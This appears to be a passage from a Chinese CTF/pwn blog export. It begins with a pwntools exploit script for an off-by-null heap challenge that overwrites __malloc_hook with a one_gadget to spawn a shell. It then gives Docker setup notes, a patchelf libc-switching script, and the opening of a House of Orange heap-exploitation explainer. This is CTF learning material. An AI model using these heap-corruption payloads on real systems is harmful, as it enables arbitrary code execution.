class="hljs-string">&#x27;-h&#x27;</span>, <span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;80&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;([^:\s]+)(?::(\d+)|\s+(\d+))?&#x27;</span>, url)<br>hostname, port = (<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>)) <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">else</span> (<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>p = (remote(hostname, port) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">else</span> process(filename))<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;de&#x27;</span>:<br>    gdbscript = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b * main</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    gdb.attach(p, gdbscript=gdbscript)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;GDB attached successfully&quot;</span>)    <br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">===============================                                                     </span><br><span class="hljs-string">          Main Menu           </span><br><span class="hljs-string">=============================== </span><br><span class="hljs-string">1.  Add                      </span><br><span class="hljs-string">2.  Edit                     </span><br><span class="hljs-string">3.  Show                     </span><br><span class="hljs-string">4.  Delete                   </span><br><span class="hljs-string">5.  Exit                     </span><br><span class="hljs-string">=============================== </span><br><span class="hljs-string">Choose an option &gt;&gt; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;How much do you want\n&#x27;</span> , <span class="hljs-built_in">str</span>(size))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter something?&#x27;</span> , content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx , content</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;2&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;input index\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  p.sendlineafter(<span class="hljs-string">&#x27;Enter something?&#x27;</span> , content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;3&#x27;</span>)<br>  p.sendafter(<span class="hljs-string">&#x27;Give me a index.Let you see see\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>) :<br>  p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;4&#x27;</span>)<br>  p.sendlineafter(<span class="hljs-string">&#x27;input index\n&#x27;</span> , <span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x30</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x68</span> , <span class="hljs-string">b&#x27;dddd&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0xf0</span> , <span class="hljs-string">b&#x27;eeee&#x27;</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x10</span> , <span class="hljs-string">b&#x27;ffff&#x27;</span>) <span class="hljs-comment">#4</span><br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">12</span> + p64(<span class="hljs-number">0x1C0</span>)<br>edit(<span class="hljs-number">2</span> , payload)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span> , <span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#5</span><br>show(<span class="hljs-number">1</span>)<br>main_arena = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> , <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">88</span><br>lss(<span class="hljs-string">&#x27;main_arena&#x27;</span>)<br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>base_addr = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lss(<span class="hljs-string">&#x27;base_addr&#x27;</span>)<br>one_gadget = [<span class="hljs-number">0x4527a</span> , <span class="hljs-number">0xf03a4</span> , <span class="hljs-number">0xf1247</span>]<br>execve = base_addr + one_gadget[<span class="hljs-number">0</span>]<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0xA0</span> , <span class="hljs-string">b&#x27;bbbb&#x27;</span>) <br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0x71</span>) + p64(fake_chunk)<br>edit(<span class="hljs-number">2</span> , payload)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;ccc&#x27;</span>)<br>add(<span class="hljs-number">0x60</span> , <span class="hljs-string">b&#x27;hhh&#x27;</span>)<br>lss(<span class="hljs-string">&#x27;fake_chunk&#x27;</span>)<br>realloc = base_addr + libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>payload = <span class="hljs-number">11</span> * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(execve) + p64(realloc + <span class="hljs-number">14</span>)<br>edit(<span class="hljs-number">5</span> , payload)<br>lss(<span class="hljs-string">&#x27;malloc_hook&#x27;</span>)<br><span class="hljs-comment"># sleep(3)</span><br>p.sendafter(<span class="hljs-string">&#x27;Choose an option &gt;&gt; &#x27;</span> , <span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;How much do you want\n&#x27;</span> , <span class="hljs-built_in">str</span>(<span class="hljs-number">0x10</span>))<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>堆</category>
      
    </categories>
    
    
    <tags>
      
      <tag>off-by-null</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker配置心得</title>
    <link href="/2024/10/21/docker%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/"/>
    <url>/2024/10/21/docker%E9%85%8D%E7%BD%AE%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h2 id="下载docker"><a href="#下载docker" class="headerlink" title="下载docker"></a>下载docker</h2><p>docker下载现在比较方便直接用官方shell脚本一键部署</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">curl -fsSL https:<span class="hljs-comment">//test.docker.com -o test-docker.sh</span><br>sudo <span class="hljs-keyword">sh</span> <span class="hljs-keyword">test</span>-docker.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><h2 id="配置docker"><a href="#配置docker" class="headerlink" title="配置docker"></a>配置docker</h2><p>安装好后需要添加当前用户到docker组中，重启生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> usermod -aG docker <span class="hljs-variable">$USER</span><br><span class="hljs-built_in">groups</span> <span class="hljs-comment">#检查当前用户组</span><br></code></pre></td></tr></table></figure><p>最最关键的一点是代理问题，刚开始一直在换国内的源，但是还是显示我用原始的源下载，因为以前都是换源后行了，突然报错，研究了一上午，最后发现配置个代理ok了，不换源配置代理，反而更快</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>  <span class="hljs-string">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span> &#123;<br>    <span class="hljs-string">&quot;http-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://192.168.15.236:7890&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;https-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://192.168.15.236:7890&quot;</span><br>  &#125;<br>&#125;<br><span class="hljs-meta">#更换为自己的ip和端口</span><br></code></pre></td></tr></table></figure><h2 id="docker使用简单命令"><a href="#docker使用简单命令" class="headerlink" title="docker使用简单命令"></a>docker使用简单命令</h2><h3 id="容器生命周期管理"><a href="#容器生命周期管理" class="headerlink" title="容器生命周期管理"></a>容器生命周期管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">run - 创建并启动一个新的容器。<br>start/stop/restart - 这些命令主要用于启动、停止和重启容器。<br><span class="hljs-built_in">kill</span> - 立即终止一个或多个正在运行的容器<br><span class="hljs-built_in">rm</span> - 于删除一个或多个已经停止的容器。<br>pause/unpause - 暂停和恢复容器中的所有进程。<br>create - 创建一个新的容器，但不会启动它。<br><span class="hljs-built_in">exec</span> - 在运行中的容器内执行一个新的命令。<br>rename - 重命名容器。<br></code></pre></td></tr></table></figure><h3 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps - 列出 Docker 容器<br>inspect - 获取 Docker 对象（容器、镜像、卷、网络等）的详细信息。<br>top - 显示指定容器中的正在运行的进程。<br>attach - 允许用户附加到正在运行的容器并与其交互。<br>events - 获取 Docker 守护进程生成的事件。<br>logs - 获取和查看容器的日志输出。<br><span class="hljs-built_in">wait</span> - 允许用户等待容器停止并获取其退出代码。<br><span class="hljs-built_in">export</span> - 将容器的文件系统导出为 tar 归档文件。<br>port - 显示容器的端口映射信息。<br>stats - 实时显示 Docker 容器的资源使用情况。<br>容器的root文件系统（rootfs）命令<br>commit - 允许用户将容器的当前状态保存为新的 Docker 镜像。<br><span class="hljs-built_in">cp</span> - 用于在容器和宿主机之间复制文件或目录。<br>diff - 显示 Docker 容器文件系统的变更。<br></code></pre></td></tr></table></figure><h3 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">login</span>/logout - 管理 Docker 客户端与 Docker 注册表的身份验证。<br>pull - 从 Docker 注册表（例如 Docker Hub）中拉取（下载）镜像到本地。<br>push - 将本地构建的 Docker 镜像推送（上传）到 Docker 注册表（如 Docker Hub 或私有注册表）。<br><span class="hljs-keyword">search</span> - 用于在 Docker Hub 或其他注册表中搜索镜像。<br></code></pre></td></tr></table></figure><h3 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">images - 列出本地的 Docker 镜像。<br>rmi - 删除不再需要的镜像。<br>tag - 创建本地镜像的别名（tag）。<br>build - 从 Dockerfile 构建 Docker 镜像。<br>history - 查看指定镜像的历史层信息。<br>save - 将一个或多个 Docker 镜像保存到一个 tar 归档文件中。<br><span class="hljs-keyword">load</span> - 从由 docker save 命令生成的 tar 文件中加载 Docker 镜像。<br><span class="hljs-keyword">import</span> - 从一个 tar 文件或 URL 导入容器快照，从而创建一个新的 Docker 镜像。<br><span class="hljs-keyword">info</span>|<span class="hljs-keyword">version</span><br><span class="hljs-keyword">info</span> - 显示 Docker 的系统级信息，包括当前的镜像和容器数量。<br><span class="hljs-keyword">version</span> - 显示 Docker 客户端和服务端的版本信息。<br>Docker Compose<br>docker compose run - 启动一个新容器并运行一个特定的应用程序。<br>docker compose rm - 启动一个新容器并删除一个特定的应用程序。<br>docker compose ps - 从 docker compose 检查 docker 容器状态。<br>docker compose build - 构建 docker compose 文件。<br>docker compose up - 运行 docker compose 文件。<br>docker compose ls - 列出 docker compose 服务。<br>docker compose <span class="hljs-keyword">start</span> - 启动 docker compose 文件创建的容器。<br>docker compose <span class="hljs-keyword">restart</span> - 重启 docker compose 文件创建的容器。<br></code></pre></td></tr></table></figure><h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs \">docker network ls: 列出所有网络。<br>docker network create &lt;network&gt;: 创建一个新的网络。<br>docker network rm &lt;network&gt;: 删除指定的网络。<br>docker network connect &lt;network&gt; &lt;container&gt;: 连接容器到网络。<br>docker network disconnect &lt;network&gt; &lt;container&gt;: 断开容器与网络的连接。<br>详细内容查看：docker network 命令<br></code></pre></td></tr></table></figure><h3 id="卷命令"><a href="#卷命令" class="headerlink" title="卷命令"></a>卷命令</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">docker <span class="hljs-built_in">volume</span> ls: 列出所有卷。<br>docker <span class="hljs-built_in">volume</span> <span class="hljs-keyword">create</span> &lt;<span class="hljs-built_in">volume</span>&gt;: 创建一个新的卷。<br>docker <span class="hljs-built_in">volume</span> rm &lt;<span class="hljs-built_in">volume</span>&gt;: 删除指定的卷。<br>docker <span class="hljs-built_in">volume</span> inspect &lt;<span class="hljs-built_in">volume</span>&gt;: 显示卷的详细信息。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>更换libc丝滑小连招</title>
    <link href="/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/"/>
    <url>/2024/09/28/%E6%9B%B4%E6%8D%A2libc%E4%B8%9D%E6%BB%91%E5%B0%8F%E8%BF%9E%E6%8B%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="更换libc丝滑小连招"><a href="#更换libc丝滑小连招" class="headerlink" title="更换libc丝滑小连招"></a>更换libc丝滑小连招</h2><p>主要参考大佬的一篇文章</p><p><a href="https://blog.csdn.net/j284886202/article/details/142406824?spm=1001.2014.3001.5502">★pwn 更改pwn题libc保姆级教程★</a></p><p>主要记录一下clibc的脚本</p><p>大佬给的脚本不是很符合自己的习惯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>FILE_NAME=<span class="hljs-variable">$1</span><br>LIBC_VERSION=<span class="hljs-variable">$2</span><br>WORKDIR=$(<span class="hljs-built_in">pwd</span>)<br><br><span class="hljs-comment"># 判断 ELF 文件位数</span><br>EBIT=$(file <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span> | <span class="hljs-built_in">cut</span> -c 1-2)<br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/i386<br><span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;64&quot;</span> ]; <span class="hljs-keyword">then</span><br>    LIBC_DIR=/usr/lib/freelibs/amd64<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It&#x27;s not an ELF file.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 查找 libc 文件</span><br>libc_dir=$(find <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_DIR</span>&quot;</span> -name <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>*&quot;</span>)<br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Not supported version or your <span class="hljs-variable">$LIBC_DIR</span> doesn&#x27;t have libc.&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 提取版本号</span><br>LIBC_VERSION_CLEAN=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;-&#x27;</span> -f 1)<br>LIBC_VERSION_MAJOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 1)<br>LIBC_VERSION_MINOR=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_CLEAN</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&#x27;.&#x27;</span> -f 2)<br><br><span class="hljs-comment"># 组合短版本号</span><br>LIBC_VERSION_SHORT=<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>.<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span><br><br><span class="hljs-comment"># 处理动态链接库</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$WORKDIR</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -gt 2 || \<br>          (<span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MAJOR</span>&quot;</span> -eq 2 &amp;&amp; <span class="hljs-string">&quot;<span class="hljs-variable">$LIBC_VERSION_MINOR</span>&quot;</span> -gt 33) ]]; <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$EBIT</span>&quot;</span> -eq <span class="hljs-string">&quot;32&quot;</span> ]; <span class="hljs-keyword">then</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">else</span><br>            patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-linux-x86-64.so.2&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">else</span><br>        patchelf --set-interpreter <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/ld-<span class="hljs-variable">$LIBC_VERSION_SHORT</span>.so&quot;</span> --set-rpath <span class="hljs-string">&quot;<span class="hljs-variable">$libc_dir</span>/&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$FILE_NAME</span>&quot;</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;success!!!&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">clibc xxx &lt;完整版本号&gt;<br><span class="hljs-attr">#clibc ret 2</span><span class="hljs-number">.27</span><span class="hljs-number">-3</span>ubu<span class="hljs-symbol">ntu1</span><span class="hljs-number">.6</span>_amd<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>这样就可以丝滑切换任何小版本了</p><h2 id="关于下载glibc-all-in-one中没有的小版本"><a href="#关于下载glibc-all-in-one中没有的小版本" class="headerlink" title="关于下载glibc-all-in-one中没有的小版本"></a>关于下载glibc-all-in-one中没有的小版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://launchpad.net/ubuntu/+<span class="hljs-built_in">source</span>/glibc/&lt;libc版本&gt; <span class="hljs-comment">##例如2.31-0ubuntu9.9</span><br></code></pre></td></tr></table></figure><p>进入网站后点击想要的版本</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411201605562.png" alt="image-20241120160500490"></p><p>在Built中下载相应的文件</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202411201606672.png" alt="image-20241120160606618"></p><p>然后拖进glibc-all-in-one中的debs</p><p>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./extract debs/libc6_2.31-0ubuntu9.9_i386.deb libs/2.31-0ubuntu9.9_i386<br>./extract debs/libc6-dbg_2.31-0ubuntu9.9_i386.deb libs/2.31-0ubuntu9.9_i386/.debug<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>更换libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>House of Orange</title>
    <link href="/2024/09/12/House-of-Orange/"/>
    <url>/2024/09/12/House-of-Orange/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中<strong>无法使用 free 函数</strong>，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求，因此会执行如下分支。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))<br></code></pre></td></tr></table></figure><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 